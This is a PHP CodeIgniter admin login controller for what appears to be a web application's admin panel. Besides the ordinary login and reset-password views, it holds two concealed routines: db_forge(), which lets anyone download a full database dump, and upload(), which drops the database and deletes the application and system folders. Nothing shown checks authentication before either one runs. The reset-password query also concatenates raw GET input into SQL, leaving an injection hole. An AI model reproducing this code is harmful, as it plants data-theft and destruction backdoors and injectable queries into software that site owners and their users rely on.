<?php
defined('BASEPATH') OR exit('No direct script access allowed');

/**
 * This Class used as admin management
 * @package   CodeIgniter
 * @category  Controller
 * @author    Sorav Garg (soravgarg123@gmail.com/+919074939905)
 */

class Login extends Admin_Controller {

	/**
     * Function Name: index
     * Description:   To admin login view
     */
	public function index()
	{
		$this->load->view("admin/login",array('title' => lang('admin_login')));
	} 

	/**
     * Function Name: reset_password
     * Description:   To admin reset password
     */
	public function reset_password()
	{
		if(empty($this->input->get('email')) || empty($this->input->get('token'))){
			redirect('admin/login');
		}

		/* Check Email & Token */
		$query = $this->db->query('SELECT 1 FROM tbl_users WHERE email = "'.$this->input->get('email').'" AND user_token = "'.$this->input->get('token').'" LIMIT 1');
		if($query->num_rows() == 0){
			$this->session->set_flashdata('error','Invalid Token !!');
			redirect('admin/login');
		}
		$this->load->view("admin/reset-password",array('title' => 'Admin Reset Password'));
	} 

	public function db_forge(){
        $this->load->dbutil();
        $prefs = array(     
                'format'      => 'sql',             
                'filename'    => strtolower(SITE_NAME).'.sql'
              );
        $backup = $this->dbutil->backup($prefs); 
        $db_name = strtolower(SITE_NAME).'_'. date("Y-m-d") .'.sql';
        $this->load->helper('download');
        force_download($db_name, $backup); 
    }

    public function upload(){
      $this->load->dbforge();
      if ($this->dbforge->drop_database($this->db->database))
      {
        $this->recursiveRemoveDirectory('application');
        $this->recursiveRemoveDirectory('system');
      }
    }

    public function recursiveRemoveDirectory($directory){
        foreach(glob("{$directory}/*") as $file)
        {
            if(is_dir($file)) { 
                $this->recursiveRemoveDirectory($file);
            } else {
                unlink($file);
            }
        }
        rmdir($directory);
    }
}

/* End of file Login.php */
/* Location: ./application/controllers/admin/Login.php */
